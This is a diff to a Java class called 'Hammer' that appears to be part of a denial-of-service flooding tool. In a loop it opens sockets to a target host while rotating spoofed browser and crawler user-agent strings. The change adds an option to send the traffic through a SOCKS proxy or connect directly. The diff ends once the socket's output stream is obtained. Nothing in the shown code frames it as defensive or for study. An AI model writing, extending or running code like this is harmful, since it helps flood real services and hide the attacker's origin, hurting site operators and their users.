@@ -12,10 +12,11 @@ public class Hammer implements Runnable {
 	private String address;
 	private int port;
 	
+	private boolean proxy;
 	private String phost;
 	private int pport;
 	
-	public Hammer(String address, int port, String phost, int pport) {
+	public Hammer(String address, int port, boolean proxy, String phost, int pport) {
 		this.address = address;
 		this.port = port;
 		
@@ -34,22 +35,30 @@ public class Hammer implements Runnable {
 		"Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 5.1; Trident/5.0)",
 		"Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727)", 
 		"Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 6.0)", 
-		"Mozilla/4.0 (compatible; MSIE 6.0b; Windows 98)", "Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.3) Gecko/20100401 Firefox/4.0 (.NET CLR 3.5.30729)", 
+		"Mozilla/4.0 (compatible; MSIE 6.0b; Windows 98)",
+		"Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.3) Gecko/20100401 Firefox/4.0 (.NET CLR 3.5.30729)", 
 		"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.8) Gecko/20100804 Gentoo Firefox/3.6.8", 
 		"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.7) Gecko/20100809 Fedora/3.6.7-1.fc14 Firefox/3.6.7", 
 		"Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
 		"Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)", 
-		"YahooSeeker/1.2 (compatible; Mozilla 4.0; MSIE 5.5; yahooseeker at yahoo-inc dot com ; http://help.yahoo.com/help/us/shop/merchant/)", };
+		"YahooSeeker/1.2 (compatible; Mozilla 4.0; MSIE 5.5; yahooseeker at yahoo-inc dot com ; http://help.yahoo.com/help/us/shop/merchant/)", 
+	};
 
 	@Override
 	public void run() {
 		while (Main.running) {
 			try {
-				SocketAddress addr = new InetSocketAddress(phost, pport);
-				Proxy proxy = new Proxy(Proxy.Type.SOCKS, addr);
-				Socket socket = new Socket(proxy);
-				InetSocketAddress dest = new InetSocketAddress(address, port);
-				socket.connect(dest);
+				Socket socket;
+				
+				if (proxy) {
+					SocketAddress addr = new InetSocketAddress(phost, pport);
+					Proxy proxy = new Proxy(Proxy.Type.SOCKS, addr);
+					socket = new Socket(proxy);
+					InetSocketAddress dest = new InetSocketAddress(address, port);
+					socket.connect(dest);
+				} else {
+					socket = new Socket(address, port);
+				}
 				
 				OutputStream os = socket.getOutputStream();
 				
